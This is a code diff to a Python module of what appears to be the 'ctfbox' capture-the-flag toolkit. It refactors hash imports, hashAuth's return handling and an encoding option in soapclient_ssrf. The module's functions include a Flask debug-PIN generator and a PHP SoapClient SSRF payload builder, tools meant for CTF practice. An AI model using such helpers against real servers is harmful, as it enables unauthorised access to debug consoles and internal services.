@@ -7,14 +7,11 @@ from json import loads
 from threading import Thread
 from typing import Union, List, Tuple, Dict
 from urllib.parse import quote, quote_plus
-from hashlib import md5
-
+from hashlib import md5 as _md5, sha1 as _sha1, sha256 as _sha256, sha512 as _sha512
 import requests
 from ctfbox.exceptions import (FlaskSessionHelperError, HashAuthArgumentError,
                                ProvideArgumentError, GeneratePayloadError, HttprawError)
 from ctfbox.utils import random_string, Context, ProvideHandler, Threader
-from ctfbox.utils import md5 as _md5
-from ctfbox.utils import sha1, sha256, sha512
 from ctfbox.thirdparty.phpserialize import serialize
 
 
@@ -30,8 +27,8 @@ content = bytes
 routePath = str
 contentType = str
 
-HASHTYPE_DICT = {HashType.MD5: _md5, HashType.SHA1: sha1,
-                 HashType.SHA256: sha256, HashType.SHA512: sha512}
+HASHTYPE_DICT = {HashType.MD5: _md5, HashType.SHA1: _sha1,
+                 HashType.SHA256: _sha256, HashType.SHA512: _sha512}
 
 
 class SoapClient(object):
@@ -159,7 +156,7 @@ def get_flask_pin(username: str, absRootPath: str, macAddress: str, machineId: s
         machineId,  # get_machine_id(), /etc/machine-id
     ]
 
-    h = md5()
+    h = _md5()
     for bit in chain(probably_public_bits, private_bits):
         if not bit:
             continue
@@ -356,11 +353,9 @@ def hashAuth(startIndex: int = 0, endIndex: int = 5, answer: str = "", maxRange:
     tasks = [run(context) for _ in range(threadNum)]
 
     for task in tasks:
-        if task.result == -1:
+        if task.result == -1 or not task.result:
             continue
-        pool = task.pool
-        pool.shutdown(wait=False)
-        return task.result
+        return str(task.result)
 
 
 def httpraw(raw: Union[bytes, str], **kwargs) -> Union[requests.Response, requests.Request]:
@@ -662,7 +657,7 @@ def soapclient_ssrf(url: str, user_agent: str = "Syclover", headers: Dict[str, s
         user_agent (str, optional): the user agent. Defaults to "Syclover".
         headers (Dict[str, str], optional): ohter headers. Defaults to {}.
         post_data (str, optional): the data you want to post. Defaults to "".
-        encode (bool, optional): whether to encode payload. Defaults to False.
+        encode (bool, optional): whether to encode payload. Defaults to True.
 
     Returns:
         Union[str, bytes]: generated payload
@@ -675,4 +670,7 @@ def soapclient_ssrf(url: str, user_agent: str = "Syclover", headers: Dict[str, s
         s = s.decode()
     except UnicodeDecodeError:
         pass
-    return quote_plus(s)
+    if encode:
+        return quote_plus(s)
+    else:
+        return s
